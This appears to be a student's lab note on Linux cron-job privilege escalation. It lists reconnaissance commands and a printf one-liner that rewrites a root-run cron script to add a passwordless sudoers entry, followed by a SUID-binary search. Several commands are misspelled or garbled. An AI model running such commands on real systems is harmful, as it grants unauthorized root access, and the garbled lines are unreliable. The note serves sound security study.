# Cron Jobs

### what is cron jobs
```Linux immplement task scheduling through utility called
  CRON
  CRON <- Time based service script that repeatedly run on a specific
  schedule
  script run repeatedly are called Cron JOBS
  use to repeate variety of function
EG: - Use for taking backups regularly
```
- Cron Tabs : Config file to track cron jobs that have been created also show active jobs\
  Cron jobs can run as **root-user**  will provide root access and thats why it is our target

- Look for:
  shell script that hafce improper permission
  {any user can edit}\
  then input cmd that would run the shell script\
  & once that CROn job in run\
  script will execute with root privs....



## DEMO

>whoami
>groups **<user>**
>cat /etc/password
>Crontab -l
- no crontab for normal userss only show cron jobs when u have admin privss
>ls -al
- look for the file that is owned by root users and copy the path
>grep -rnw /usr -e "/home/student/message"
- r = recursive
- n = new
- w = exact match
>copy.sh
>ls -al /temp
>cat /tmp/msg
>ls -al /usr/share/copy.sh
>cat copy.sh
- if no txt editor
- use shell
>printf '#! /bin/bash\hecho"student -ALL=NO PASSWD:ALL">>/etc/sudoers' > /usr/local/share/copy.sh
>cat copy.sh
- to view the part of sudo group
>sudo -l
>sudo u
>crontab -l

### printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh



# >find / -perm -4000 -type f 2>/dev/null
